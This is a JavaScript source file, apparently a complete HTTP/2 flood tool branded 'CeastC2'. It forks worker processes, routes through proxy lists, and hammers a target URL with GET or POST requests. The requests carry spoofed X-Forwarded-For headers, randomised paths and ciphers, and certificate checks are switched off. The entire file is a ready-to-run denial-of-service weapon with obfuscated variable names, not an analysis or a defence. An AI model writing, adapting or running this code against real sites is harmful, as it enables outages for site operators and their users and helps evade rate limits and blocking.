process.on('uncaughtException', function (_0x5d67c3) {})
process.on('unhandledRejection', function (_0x4bf62b) {})
require('events').EventEmitter.defaultMaxListeners = 0
const fs = require('fs'),
  url = require('url'),
  randstr = require('randomstring')
var path = require('path')
const cluster = require('cluster'),
  http2 = require('http2')
var fileName = __filename,
  file = path.basename(fileName)
let headerbuilders,
  COOKIES = undefined,
  POSTDATA = undefined
process.argv.length < 7 && (console.log(''), process.exit(0))
let randomparam = false
var proxies = fs
    .readFileSync('alive1.txt', 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\n'),
  UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'),
  rate = process.argv[5],
  target_url = process.argv[3]
const target = target_url.split('""')[0]
process.argv.forEach((_0x14a988) => {
  if (
    _0x14a988.includes('cookie=') &&
    !process.argv[2].split('""')[0].includes(_0x14a988)
  ) {
    COOKIES = _0x14a988.slice(7)
  } else {
    if (
      _0x14a988.includes('postdata=') &&
      !process.argv[2].split('""')[0].includes(_0x14a988)
    ) {
      process.argv[2].toUpperCase() != 'POST' &&
        (console.error(''), process.exit(1))
      POSTDATA = _0x14a988.slice(9)
    } else {
      if (_0x14a988.includes('randomstring=')) {
        randomparam = _0x14a988.slice(13)
        console.log('')
      } else {
        if (_0x14a988.includes('headerdata=')) {
          headerbuilders = {
            'Cache-Control': 'max-age=0',
            Referer: target,
            'X-Forwarded-For': spoof(),
            Cookie: COOKIES,
            ':method': 'GET',
          }
          if (_0x14a988.slice(11).split('""')[0].includes('&')) {
            const _0x2513e8 = _0x14a988.slice(11).split('""')[0].split('&')
            for (let _0x3eb55f = 0; _0x3eb55f < _0x2513e8.length; _0x3eb55f++) {
              const _0x453888 = _0x2513e8[_0x3eb55f].split('=')[0],
                _0xe3e105 = _0x2513e8[_0x3eb55f].split('=')[1]
              headerbuilders[_0x453888] = _0xe3e105
            }
          } else {
            const _0x494809 = _0x14a988.slice(11).split('""')[0],
              _0xbd1d14 = _0x494809.split('=')[0],
              _0x211b0f = _0x494809.split('=')[1]
            headerbuilders[_0xbd1d14] = _0x211b0f
          }
        }
      }
    }
  }
})
COOKIES !== undefined ? console.log('') : (COOKIES = '')
POSTDATA !== undefined ? console.log('') : (POSTDATA = '')
if (headerbuilders !== undefined) {
  console.log('')
  const proxies_total = proxies.length - 2,
    ua_total = UAs.length - 2
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
    	console.clear();
        console.log('\x1b[32m(CeastC2) \x1b[94mAttack Send\x1b[0m');
      cluster.fork()
    }
    if (process.argv[8] == 'n') {
      var result = 'Random Numbers'
    } else {
      var result = 'Random Letters'
    }
    console.log(' Target:' + process.argv[3])
    console.log(' Method(POST/GET):' + process.argv[2])
    console.log(' Time:' + process.argv[4] + 'seconds')
    console.log(' Thread:' + process.argv[6] + '/' + process.argv[5])
    console.log(' Random Quantity:' + process.argv[7])
    console.log(' Random Number:' + result)
    console.log(' Proxy:' + (proxies_total + 2) + ' HTTP Proxy ')
    console.log(' User-agent:' + (ua_total + 2) + ' UA')
    setTimeout(() => {
      process.exit(1)
    }, process.argv[4] * 1000)
  } else {
    startflood()
  }
} else {
  headerbuilders = {
    'Cache-Control': 'max-age=0',
    Referer: target,
    'X-Forwarded-For': spoof(),
    Cookie: COOKIES,
    ':method': 'GET',
  }
  const proxies_total = proxies.length - 2,
    ua_total = UAs.length - 2
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
      cluster.fork()
    }
    if (process.argv[8] == 'n') {
      var result = 'Random Numbers'
    } else {
      var result = 'Random Letters'
    }
    console.log(' Target:' + process.argv[3])
    console.log(' Method(POST/GET):' + process.argv[2])
    console.log(' Time:' + process.argv[4] + 'seconds')
    console.log(' Thread:' + process.argv[6] + '/' + process.argv[5])
    console.log(' Random Quantity:' + process.argv[7])
    console.log(' Random Number:' + result)
    console.log(' Proxy:' + (proxies_total + 2) + ' HTTP Proxy ')
    console.log(' User-agent:' + (ua_total + 2) + ' UA')
    setTimeout(() => {
      process.exit(1)
    }, process.argv[4] * 1000)
  } else {
    startflood()
  }
}
var parsed = url.parse(target)
process.setMaxListeners(0)
if (process.argv[8] == 'n') {
  function ra() {
    const _0x3b29a6 = randstr.generate({
      charset: '01234567890123456789',
      length: process.argv[7],
    })
    return _0x3b29a6
  }
} else {
  function ra() {
    const _0x5f2390 = randstr.generate({
      charset: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890',
      length: process.argv[7],
    })
    return _0x5f2390
  }
}
function spoof() {
  return (
    '' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    '.' +
    randstr.generate({
      length: 1,
      charset: '12',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    }) +
    randstr.generate({
      length: 1,
      charset: '012345',
    })
  )
}
const cplist = [
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
]
function startflood() {
  if (process.argv[2].toUpperCase() == 'POST') {
    const _0x8cab27 = url.parse(target).path.replace('[rand]', ra())
    headerbuilders[':method'] = 'POST'
    headerbuilders['Content-Type'] = 'text/plain'
    randomparam
      ? setInterval(() => {
          headerbuilders['User-agent'] =
            UAs[Math.floor(Math.random() * UAs.length)]
          var _0x38a5e6 = cplist[Math.floor(Math.random() * cplist.length)],
            _0x59cc07 = proxies[Math.floor(Math.random() * proxies.length)]
          _0x59cc07 = _0x59cc07.split(':')
          var _0x55bc95 = require('http'),
            _0x36e3a4 = require('tls')
          _0x36e3a4.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x9abbc3 = _0x55bc95.request(
            {
              host: _0x59cc07[0],
              port: _0x59cc07[1],
              ciphers: _0x38a5e6,
              method: 'CONNECT',
              path: parsed.host + ':443',
            },
            (_0x5919d7) => {
              _0x9abbc3.end()
              return
            }
          )
          _0x9abbc3.on('connect', function (_0x3d54d6, _0x4264a5, _0x2496ca) {
            const _0x5dab2e = http2.connect(parsed.href, {
              createConnection: () =>
                _0x36e3a4.connect(
                  {
                    host: parsed.host,
                    ciphers: _0x38a5e6,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: _0x4264a5,
                  },
                  function () {
                    for (let _0x851f7c = 0; _0x851f7c < rate; _0x851f7c++) {
                      headerbuilders[':path'] =
                        url.parse(target).path.replace('[rand]', ra()) +
                        '?' +
                        randomparam +
                        '=' +
                        randstr.generate({
                          length: 12,
                          charset:
                            'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
                        })
                      headerbuilders['X-Forwarded-For'] = spoof()
                      headerbuilders.Body =
                        '' +
                        (POSTDATA.includes('[rand]')
                          ? POSTDATA.replace('[rand]', ra())
                          : POSTDATA)
                      headerbuilders.Cookie.replace('[rand]', ra())
                      const _0x4688b9 = _0x5dab2e.request(headerbuilders)
                      _0x4688b9.end()
                      _0x4688b9.on('response', () => {
                        _0x4688b9.close()
                      })
                    }
                  }
                ),
            })
          })
          _0x9abbc3.end()
        })
      : setInterval(() => {
          headerbuilders['User-agent'] =
            UAs[Math.floor(Math.random() * UAs.length)]
          var _0x45b609 = cplist[Math.floor(Math.random() * cplist.length)],
            _0x5ccc33 = proxies[Math.floor(Math.random() * proxies.length)]
          _0x5ccc33 = _0x5ccc33.split(':')
          var _0x247ab8 = require('http'),
            _0x1daca7 = require('tls')
          _0x1daca7.DEFAULT_MAX_VERSION = 'TLSv1.3'
          var _0x5e264e = _0x247ab8.request(
            {
              host: _0x5ccc33[0],
              port: _0x5ccc33[1],
              ciphers: _0x45b609,
              method: 'CONNECT',
              path: parsed.host + ':443',
            },
            (_0x38d00f) => {
              _0x5e264e.end()
              return
            }
          )
          _0x5e264e.on('connect', function (_0x4eee9e, _0x9b2553, _0x13222f) {
            const _0x170816 = http2.connect(parsed.href, {
              createConnection: () =>
                _0x1daca7.connect(
                  {
                    host:
                      '' +
                      (url.parse(target).path.includes('[rand]')
                        ? _0x8cab27
                        : url.parse(target).path),
                    ciphers: _0x45b609,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: _0x9b2553,
                  },
                  function () {
                    for (let _0x1af8f9 = 0; _0x1af8f9 < rate; _0x1af8f9++) {
                      headerbuilders[':path'] =
                        '' + url.parse(target).path.replace('[rand]', ra())
                      headerbuilders['X-Forwarded-For'] = spoof()
                      headerbuilders.Body =
                        '' +
                        (POSTDATA.includes('[rand]')
                          ? POSTDATA.replace('[rand]', ra())
                          : POSTDATA)
                      headerbuilders.Cookie.replace('[rand]', ra())
                      const _0xba056c = _0x170816.request(headerbuilders)
                      _0xba056c.end()
                      _0xba056c.on('response', () => {
                        _0xba056c.close()
                      })
                    }
                  }
                ),
            })
          })
          _0x5e264e.end()
        })
  } else {
    process.argv[2].toUpperCase() == 'GET'
      ? ((headerbuilders[':method'] = 'GET'),
        randomparam
          ? setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x5470bb = cplist[Math.floor(Math.random() * cplist.length)],
                _0x518c88 = proxies[Math.floor(Math.random() * proxies.length)]
              _0x518c88 = _0x518c88.split(':')
              var _0x27408d = require('http'),
                _0x1e882a = require('tls')
              _0x1e882a.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x46913f = _0x27408d.request(
                {
                  host: _0x518c88[0],
                  port: _0x518c88[1],
                  ciphers: _0x5470bb,
                  method: 'CONNECT',
                  path: parsed.host + ':443',
                },
                (_0x5ed0ee) => {
                  _0x46913f.end()
                  return
                }
              )
              _0x46913f.on(
                'connect',
                function (_0x33d547, _0xac5843, _0x1ca03e) {
                  const _0x362a10 = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x1e882a.connect(
                        {
                          host: parsed.host,
                          ciphers: _0x5470bb,
                          secureProtocol: 'TLS_method',
                          servername: parsed.host,
                          secure: true,
                          rejectUnauthorized: false,
                          ALPNProtocols: ['h2'],
                          socket: _0xac5843,
                        },
                        function () {
                          for (
                            let _0x59bc26 = 0;
                            _0x59bc26 < rate;
                            _0x59bc26++
                          ) {
                            headerbuilders[':path'] =
                              url.parse(target).path.replace('[rand]', ra()) +
                              '?' +
                              randomparam +
                              '=' +
                              randstr.generate({
                                length: 12,
                                charset:
                                  'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
                              })
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('[rand]', ra())
                            const _0x229362 = _0x362a10.request(headerbuilders)
                            _0x229362.end()
                            _0x229362.on('response', () => {
                              _0x229362.close()
                            })
                          }
                        }
                      ),
                  })
                }
              )
              _0x46913f.end()
            })
          : setInterval(() => {
              headerbuilders['User-agent'] =
                UAs[Math.floor(Math.random() * UAs.length)]
              var _0x5d199c = cplist[Math.floor(Math.random() * cplist.length)],
                _0x41583e = proxies[Math.floor(Math.random() * proxies.length)]
              _0x41583e = _0x41583e.split(':')
              var _0x7c789 = require('http'),
                _0x444b09 = require('tls')
              _0x444b09.DEFAULT_MAX_VERSION = 'TLSv1.3'
              var _0x436835 = _0x7c789.request(
                {
                  host: _0x41583e[0],
                  port: _0x41583e[1],
                  ciphers: _0x5d199c,
                  method: 'CONNECT',
                  path: parsed.host + ':443',
                },
                (_0x1c3f43) => {
                  _0x436835.end()
                  return
                }
              )
              _0x436835.on(
                'connect',
                function (_0x27b264, _0x4a82b3, _0x497269) {
                  const _0x32a8e6 = http2.connect(parsed.href, {
                    createConnection: () =>
                      _0x444b09.connect(
                        {
                          host: parsed.host,
                          ciphers: _0x5d199c,
                          secureProtocol: 'TLS_method',
                          servername: parsed.host,
                          secure: true,
                          rejectUnauthorized: false,
                          ALPNProtocols: ['h2'],
                          socket: _0x4a82b3,
                        },
                        function () {
                          for (
                            let _0x8008f1 = 0;
                            _0x8008f1 < rate;
                            _0x8008f1++
                          ) {
                            headerbuilders[':path'] =
                              '' +
                              url.parse(target).path.replace('[rand]', ra())
                            headerbuilders['X-Forwarded-For'] = spoof()
                            headerbuilders.Cookie.replace('[rand]', ra())
                            const _0x584df8 = _0x32a8e6.request(headerbuilders)
                            _0x584df8.end()
                            _0x584df8.on('response', () => {
                              _0x584df8.close()
                            })
                          }
                        }
                      ),
                  })
                }
              )
              _0x436835.end()
            }))
      : (console.log('Attacking'), process.exit(1))
  }
}